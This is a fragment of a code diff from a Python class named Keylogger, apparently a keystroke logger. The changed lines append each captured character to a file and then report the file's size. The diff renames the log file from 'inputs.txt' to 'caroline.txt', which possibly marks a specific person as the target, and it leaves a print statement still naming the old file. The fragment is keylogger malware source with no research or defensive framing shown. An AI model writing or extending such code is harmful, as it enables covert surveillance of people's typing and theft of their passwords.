@@ -41,10 +41,10 @@ class Keylogger:
 		else :
 			self.currentInput = (chr(event.Ascii)+"\n")
 
-		with open("inputs.txt", "a") as f:
+		with open("caroline.txt", "a") as f:
 			f.write(self.currentInput)
 
-		f = open("inputs.txt")
+		f = open("caroline.txt")
 		f.seek(0, os.SEEK_END)
 		print('Size of inputs.txt is', f.tell(), 'bytes')
 
